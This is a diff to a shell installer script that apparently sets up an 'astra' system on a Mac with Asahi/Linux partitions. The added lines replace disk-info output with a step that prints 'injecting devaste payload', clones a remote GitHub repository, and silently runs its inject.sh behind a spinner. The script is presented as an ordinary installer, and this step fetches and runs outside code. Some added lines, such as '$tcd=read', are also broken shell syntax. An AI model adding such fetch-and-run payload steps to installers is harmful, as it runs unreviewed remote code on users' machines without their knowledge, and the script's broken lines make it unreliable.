@@ -33,7 +33,7 @@ echo
    $usrm=read -r -p "  1. Modern" th1
      if $th1; then
      echo "  ! Would you like to install: \033[1;34mModern\033[0m?"
-     read
+     $tcd=read
      sleep 0.8
      echo "  ! Your preference has been saved. astra will install as [\033[1;34mModern\033[0m] later."
      fi
@@ -83,15 +83,15 @@ diskutil list /dev/disk0 | grep -Ei 'asahi|linux|EFI' | while read i; do
     echo "oh ok"
 done
 
-diskutil info /dev/disk0 | grep -i "GUID" | while read i; do
-  echo "$i"
-done
-diskutil info /dev/disk0 | grep -i "Disk Size:" | while read i; do
-  echo "$i"
-done
-
-# worst mistake of my life hell no, later
-sleep 1
+printf ' -> injecting devaste payload  '
+(while :; do for c in / - \\ \|; do printf '\b%s' "$c"; sleep 0.2; done; done) &
+git clone --quiet -n --depth=1 --filter=tree:0 \
+    https://github.com/vastrave/devaste
+    #
+cd devaste
+  git sparse-checkout set --no-cone install
+    git checkout
+    sh devaste/inject.sh
 printf '\n'; kill $! && wait $!; } 2>/dev/null
 
  printf ' -> installing astra  '
